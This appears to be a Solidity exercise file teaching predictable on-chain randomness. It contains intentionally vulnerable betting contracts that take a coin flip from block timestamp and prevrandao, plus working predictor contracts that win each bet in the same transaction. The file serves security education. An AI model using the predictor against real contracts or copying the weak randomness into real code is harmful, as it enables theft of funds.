// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
Exercise Type A (write exploit):
A1: Predict current-block pseudo-randomness in same tx.
A2: Adapt predictor when formula changes to blockhash and timestamp.
*/
contract ExerciseA_VulnerableGame {
    function fund() external payable {}

    function bet(bool guessEven) external payable {
        require(msg.value == 1 ether, "bet must be 1 ether");

        uint256 r = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % 2;
        if ((r == 0) == guessEven) {
            (bool ok,) = payable(msg.sender).call{value: 2 ether}("");
            require(ok, "payout failed");
        }
    }
}

contract ExerciseA_PredictorTemplate {
    function attack(ExerciseA_VulnerableGame game) external payable {
        uint256 r = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % 2;
        game.bet{value: msg.value}(r == 0);
    }

    receive() external payable {}
}

/*
Exercise Type B (write fix):
A vulnerable game + predictor primitive are provided.
Patch game design only (commit/reveal or external RNG integration point).
*/
contract ExerciseB_VulnerableGame {
    function fund() external payable {}

    function bet(bool guessEven) external payable {
        require(msg.value == 1 ether, "bet must be 1 ether");

        uint256 r = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % 2;
        if ((r == 0) == guessEven) {
            (bool ok,) = payable(msg.sender).call{value: 2 ether}("");
            require(ok, "payout failed");
        }
    }
}

contract ExerciseB_WorkingPredictor {
    function attack(ExerciseB_VulnerableGame game) external payable {
        uint256 r = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % 2;
        game.bet{value: msg.value}(r == 0);
    }

    receive() external payable {}
}
